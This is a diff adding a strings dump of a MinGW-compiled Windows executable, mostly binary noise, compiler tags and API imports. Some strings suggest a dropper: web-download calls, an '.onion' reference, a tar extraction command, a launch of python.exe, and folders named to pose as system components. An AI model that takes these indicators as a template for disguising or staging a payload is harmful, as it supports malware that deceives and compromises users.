@@ -1,0 +1,423 @@
+!This program cannot be run in DOS mode.
+.text
+`.data
+.rdata
+@.eh_fram
+@.bss
+.idata
+@.tls
+.rsrc
+@.reloc
+WVSQ
+Y[^_]
+$ D@
+MZuH
+=p {
+Y[^_]
+5L {
+Y[^_]
+$0>@
+[^_]
+Http
+Quer
+yInf
+wini
+net.
+<<tq
+.pet
+.moe
+gfff
+$4 {
+$< {
+$`<@
+[^_]
+5t {
+[^_]
+;5x {
+[^_]
+[^_]
+8MZu
+[^_]
+@' t
+@$[^]
+l[^_]
+f->@
+B 9B$~
+C 9C$~
+L[^_]
+S 9S$~
+S 9S$~
+,[^_]
+,[^_]
+C 9C$~
+C 9C$~
+[^_]
+C 9C$~
+S 9S$~
+[^_]
+C 9C$~
+[^_]
+[^_]
+=UUUUw
+[^_]
+[^_]
+gfff
+gfff
+,[^_]
+ [^]
+ [^]
+S 9S$~
+ [^]
+,[^_]
+,[^_]
+,[^_]
+gfff
+gfff
+\[^_]
+[^_]
+s)+U
+L[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+$ *{
+$8*{
+$ *{
+$8*{
+$ *{
+$ *{
+[^_]
+$ *{
+L[^_]
+$8*{
+[^_]
+$8*{
+<[^_]
+290t
+:98t
+L[^_]
+L[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+,[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+[^_]
+<[^_]
+[^_]
+[^_]
+[^_]
+0[^]
+%(2{
+%,2{
+%02{
+%42{
+%82{
+%<2{
+%@2{
+%D2{
+%H2{
+%L2{
+%P2{
+%T2{
+%X2{
+%\2{
+%`2{
+%d2{
+%h2{
+%l2{
+%p2{
+%t2{
+%x2{
+%|2{
+Y[^]
+libgcc_s_dw2-1.dll
+__register_frame_info
+__deregister_frame_info
+<!DOC
+<html
+<HTML
+.onion
+%s\python.exe
+tar.exe -xf "%s" -C "%s"
+Low_Graphics_Cache
+Sys_Diagnostics
+Windows_Driver_Host
+Update_Temp_Store
+Cache_Sys
+%s\%s
+%s%s
+%s\Downloads\%s
+"%s" "%s"
+Unknown error
+_matherr(): %s in %s(%g, %g)  (retval=%g)
+Argument domain error (DOMAIN)
+Argument singularity (SIGN)
+Overflow range error (OVERFLOW)
+The result is too small to be represented (UNDERFLOW)
+Total loss of significance (TLOSS)
+Partial loss of significance (PLOSS)
+Mingw-w64 runtime failure:
+Address %p has no image-section
+  VirtualQuery failed for %d bytes at address %p
+  VirtualProtect failed with code 0x%x
+  Unknown pseudo relocation protocol version %d.
+  Unknown pseudo relocation bit size %d.
+%d bit pseudo relocation at %p out of range, targeting %p, yielding the value %p.
+(null)
+Infinity
+aCoc
+<2ZGU
+vH7B
+W4vC
+[%Co
+O8M2
+msvcrt.dll
+___lc_codepage_func
+__lc_codepage
+3)6{
+3)6{
+wG3F 
+(^eN
+j><K
+\YeA
+1"EYg-
+!|D'
+fAo)
+iunG
+Bbk:
+1\Q4
+`.QS
+]$C9"D
+{i3[
+3]X+'/
+-qZ~C
+Y3@(G
+70q)
+K$ZQH
+3!XI-X
+`O7I
++M\}
+Q2ST
+D5,)
+uO0D
+8m0:s
+Dw=)
+'1nD
+4"&%
+VHYu
+RX0e
+#3:O&
+F0:s
+Dw=>
+@Qm6t
+3)6{
+3)6{
+3)6{
+3)6{
+3)6{
+3)6{
+3)6{
+3)6{
+3)6{
+3)6{
+3)6{
+3)6{
+3)6{
+3)6{
+3)6{
+3)6{
+=9a+.
+Ure]
+qAZf4[
+GCC: (GNU) 15-win32
+GCC: (GNU) 13-win32
+GCC: (GNU) 13-win32
+GCC: (GNU) 15-win32
+GCC: (GNU) 15-win32
+GCC: (GNU) 15-win32
+GCC: (GNU) 15-win32
+GCC: (GNU) 15-win32
+GCC: (GNU) 15-win32
+GCC: (GNU) 15-win32
+GCC: (GNU) 15-win32
+GCC: (GNU) 15-win32
+GCC: (GNU) 15-win32
+GCC: (GNU) 15-win32
+GCC: (GNU) 15-win32
+GCC: (GNU) 15-win32
+GCC: (GNU) 15-win32
+GCC: (GNU) 15-win32
+GCC: (GNU) 15-win32
+GCC: (GNU) 15-win32
+GCC: (GNU) 15-win32
+GCC: (GNU) 15-win32
+GCC: (GNU) 15-win32
+GCC: (GNU) 15-win32
+GCC: (GNU) 15-win32
+GCC: (GNU) 13-win32
+GCC: (GNU) 15-win32
+GCC: (GNU) 15-win32
+GCC: (GNU) 15-win32
+GCC: (GNU) 15-win32
+GCC: (GNU) 15-win32
+GCC: (GNU) 15-win32
+GCC: (GNU) 15-win32
+GCC: (GNU) 15-win32
+GCC: (GNU) 15-win32
+GCC: (GNU) 15-win32
+GCC: (GNU) 15-win32
+GCC: (GNU) 15-win32
+GCC: (GNU) 15-win32
+GCC: (GNU) 15-win32
+GCC: (GNU) 15-win32
+GCC: (GNU) 15-win32
+GCC: (GNU) 15-win32
+GCC: (GNU) 15-win32
+GCC: (GNU) 15-win32
+GCC: (GNU) 13-win32
+CloseHandle
+CreateDirectoryA
+CreateFileA
+DeleteCriticalSection
+DeleteFileA
+EnterCriticalSection
+ExpandEnvironmentStringsA
+FreeLibrary
+GetCurrentProcess
+GetExitCodeProcess
+GetFileAttributesA
+GetLastError
+GetModuleHandleA
+GetProcAddress
+GetStartupInfoA
+GetTempPathA
+GetTickCount
+InitializeCriticalSection
+IsDBCSLeadByteEx
+IsWow64Process
+LeaveCriticalSection
+LoadLibraryA
+MultiByteToWideChar
+SetUnhandledExceptionFilter
+Sleep
+TlsGetValue
+VirtualProtect
+VirtualQuery
+WaitForSingleObject
+WideCharToMultiByte
+WriteFile
+__p__iob
+__p___initenv
+__p___mb_cur_max
+__p__acmdln
+__p__commode
+__p__fmode
+__set_app_type
+__setusermatherr
+_amsg_exit
+_cexit
+_errno
+_initterm
+_ismbblead
+atexit
+abort
+atoi
+calloc
+exit
+fclose
+fopen
+fprintf
+fputc
+fputs
+free
+localeconv
+malloc
+memcmp
+memcpy
+memset
+rand
+setlocale
+signal
+srand
+strcat
+strchr
+strerror
+strlen
+strncmp
+strstr
+vfprintf
+wcslen
+__getmainargs
+VariantInit
+DispatchMessageA
+PeekMessageA
+TranslateMessage
+KERNEL32.dll
+msvcrt.dll
+OLEAUT32.dll
+USER32.dll
+I0V0_0m0{0
+1*10181?1Q1[1e1p1z1
+2$2+2?2N2V2b2i2x2
+2"3U3]3d3t3
+4,424B4H4N4V4^4p4}4
+;";-;;;@;T;_;m;r;
+<+<H<
+=O>q>
+>2?m?
+2&24292M2X2
+4!4/444H4S4
+4 5<5Y5
+617a7t7
+9%909
+:9:J:d:i:}:
+;M;];b;v;
+;9<I<N<b<m<
+=,=6=`=
+>1><>~>
+?7?A?^?h?
+0!0B0t0
+141@1]1g1
+2Z2m2
+3(303I3S3p3
+4#474B4U4r4
+5!6=6Q6V6j6u6
+8#878B8
+969S95:H:R:o:Q;d;o;a<
+=!=2=
+=6>M>
+?a?}?
+000B0V0k0
+2:2@2d2n2|2
+3*3`3e3r3
+6"6A6
+6#7)7B7i7w7
+83898
+9"9(959@9J9S9~9
+:%:3:>:\:f:l:
+;%;3;C;R;Z;a;
+;9<`<
+0A1~2
+4H5j5
+>3>P?r?x?
+5 5*505:5E5U5^5
+6>6a6u6
+8*808Q8Y8
+366|6
+:2;:;B;J;R;Z;b;j;r;z;
+<"<*<2<:<B<J<R<Z<b<j<r<z<
+=1=I=
+D1H1L1P1T1|2
+4 4$4(4,4044484<4@4D4H4L4P4T4X4\4`4d4h4l4p4t4x4|4
+5 5$5(5,5054585<5@5D5H5L5P5T5X5\5`5d5h5
